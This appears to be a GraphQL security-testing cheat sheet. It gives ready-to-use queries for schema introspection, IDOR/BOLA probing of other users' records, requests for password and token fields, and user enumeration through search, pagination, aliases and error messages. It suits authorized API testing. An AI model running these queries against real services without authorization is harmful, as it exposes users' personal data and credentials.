Common cheat sheet patterns

📚 1. Basic GraphQL Query Structure
{
  user(id: 1) {
    id
    name
    email
  }
}

✍🏽 2. Query With Nested Fields
{
  user(id: 1) {
    name
    orders {
      id
      total
      status
    }
  }
}

🔄 3. Mutation (GraphQL version of POST request)
mutation {
  updateUser(id: 1, input: { name: "Omni" }) {
    id
    name
  }
}

🧠 4. GraphQL Introspection (HACKER GOLD)

This is how you enumerate EVERYTHING in the schema.

⭐ Full schema dump
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

List all queries & mutations
{
  __schema {
    queryType { name }
    mutationType { name }
  }
}

Find hidden fields
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}

🧨 5. IDOR Testing in GraphQL
{
  user(id: 2) {
    email
    role
    orders {
      id
      total
    }
  }
}


If the app returns someone else’s data → IDOR/BOLA.

🔐 6. Sensitive Field Discovery

Try asking for dangerous fields:

{
  user(id: 1) {
    password
    token
    resetToken
    permissions
  }
}


If any of these return → HIGH severity vulnerability.

🕵🏽‍♀️ 7. Search Function Abuse

If the API has a search field:

{
  searchUsers(query: "a") {
    id
    email
    phone
  }
}


This often leaks full directory listings.

🔄 8. Pagination Enumeration
{
  users(limit: 50, offset: 0) {
    id
    email
  }
}


Change offsets to enumerate ALL users.

🧩 9. Error-Based Enumeration

If a field doesn’t exist, GraphQL may leak:

valid fields

internal types

stack traces

Test:

{
  user(id: "abc") {
    doesNotExist
  }
}

📝 10. Aliases (VERY powerful)

You can request the same field multiple times:

{
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}


This is how hackers enumerate much faster.

